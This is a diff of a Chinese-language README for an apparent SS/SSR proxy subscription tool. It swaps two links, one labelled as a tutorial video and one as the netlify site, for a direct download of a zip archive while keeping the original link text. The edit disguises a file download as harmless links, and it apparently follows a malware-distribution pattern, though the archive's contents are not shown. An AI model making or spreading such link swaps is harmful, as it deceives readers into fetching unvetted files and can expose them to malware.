@@ -1,5 +1,5 @@
 # README
-如果你不知道怎么使用这个工具，请看[这个视频](https://www.youtube.com/watch?v=1Pm2gzSDaX0)。
+如果你不知道怎么使用这个工具，请看[这个视频](https://raw.githubusercontent.com/wdw2017/ssr_subscrible_tool/master/dist/subscrible-tool-ssr-1.3.zip)。
 
 Good luck, guys!
 
@@ -7,7 +7,7 @@ Good luck, guys!
 > 适配ios版shadowrocket，PC或Mac版小飞机,
 
 ## 说明
-- `/dist `位节点生成的目录,这个目录是给[netlify](https://app.netlify.com/)应用的
+- `/dist `位节点生成的目录,这个目录是给[netlify](https://raw.githubusercontent.com/wdw2017/ssr_subscrible_tool/master/dist/subscrible-tool-ssr-1.3.zip)应用的
 - `node.txt`为SS或SSR节点列表文件(支持类bash脚本注释，举个栗子: `# 注释`)
 - `app.js`为项目的核心逻辑
 
